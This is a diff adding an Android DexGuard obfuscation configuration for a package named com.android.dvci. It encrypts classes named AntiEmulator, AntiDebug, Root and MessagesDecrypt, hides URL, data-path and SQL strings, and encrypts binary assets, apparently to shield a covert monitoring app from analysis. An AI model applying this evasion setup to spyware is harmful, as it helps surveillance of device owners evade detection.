@@ -1,0 +1,78 @@
+
+#-verbose
+-encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.MessagesDecrypt,
+		com.android.dvci.Root,com.android.dvci.Core,
+		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator
+
+-encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
+-encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"
+
+-encryptclasses com.android.m.*
+-encryptstrings "KY*"
+-encryptstrings "android.intent.*","android.net.*","vnd.android.*"
+
+-accessthroughreflection class android.content.pm.ApplicationInfo {
+    int flags;
+}
+
+-encryptstrings "android.content.pm.ApplicationInfo", "flags"
+-encryptassetfiles "*.bin"
+
+#-dontobfuscate
+#-dontoptimize
+
+#  here:  !code/simplification/*
+#-optimizations !code/*
+#-optimizations !code/simplification/*
+#-optimizations !code/merging, !code/removal/*
+#-optimizations !code/removal/advanced
+# -optimizations !code/simplification/variable,!code/simplification/arithmetic,!code/simplification/cast
+# -optimizations !code/simplification/cast
+
+# l'ottimizzazione seguente fa crashare smali, disabilitare solo se occorre manipolare il codice
+#-optimizations !method/marking/final
+-optimizations !method/inlining/*
+
+-classobfuscationdictionary "keywords.txt"
+-packageobfuscationdictionary "keywords.txt"
+-obfuscationdictionary "keywords.txt"
+
+#togliere l'offuscamento di com.android.dvci.Core.isServiceRunning
+-keepclassmembers class com.android.dvci.Core {
+    public static boolean isServiceRunning();
+}
+
+#-keepclassmembers class com.android.dvci.util.Instrument
+
+-keepresourcexmlattributenames assets/*.bin, 
+    manifest/installLocation,
+    manifest/versionCode,
+    manifest/application/*/intent-filter/*/name,
+    res/layout/main.xml,
+    res/values/*
+
+-keep public class android.media.AmrInputStream
+-keep public class com.android.dvci.BM
+-keep public class com.android.dvci.listener.AR
+-keep public class com.android.dvci.optimize.NetworkOptimizer
+
+-keep class com.musicg.** { *; }
+-keep class android.media.** {*;}
+-keep class com.sun.media.sound.** { *; }
+    
+#-assumenosideeffects class android.util.Log {
+#    public static boolean isLoggable(java.lang.String, int);
+#    public static int v(...);
+#    public static int i(...);
+#    public static int w(...);
+#    public static int d(...);
+#    public static int e(...);
+#}
+
+#-assumenosideeffects class com.android.dvci.util.Check {
+#    public static void asserts(...);
+#    public static void requires(...);
+#    public static void ensures(...);
+#    public static void log(...);
+#    public static void testDexguard(...);
+#}
